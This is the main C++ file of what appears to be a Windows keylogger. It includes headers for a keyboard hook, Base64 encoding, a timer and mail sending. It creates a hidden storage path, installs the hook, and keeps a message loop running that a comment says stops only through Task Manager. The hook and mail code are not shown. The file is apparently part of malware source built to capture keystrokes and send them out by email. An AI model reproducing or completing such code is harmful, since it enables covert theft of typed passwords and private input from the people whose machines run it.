#include <iostream>
#include <windows.h>
#include "Helper.h"
#include "Constants.h"
#include "Base64.h"
#include "IO.h"
#include "Timer.h"
#include "SendMail.h"
#include "KeyboardHook.h"
using namespace std;


int main() {
    MSG msg;
    IO::mkDir(IO::getPath(true));  // creates default path
    InstallHook();
    while(GetMessage (&msg, NULL, 0, 0)) {  // makes program not stop (except w task manager)
        TranslateMessage(&msg);
        DispatchMessageA(&msg);
    }

    MailTimer.Stop();
    return 0;
}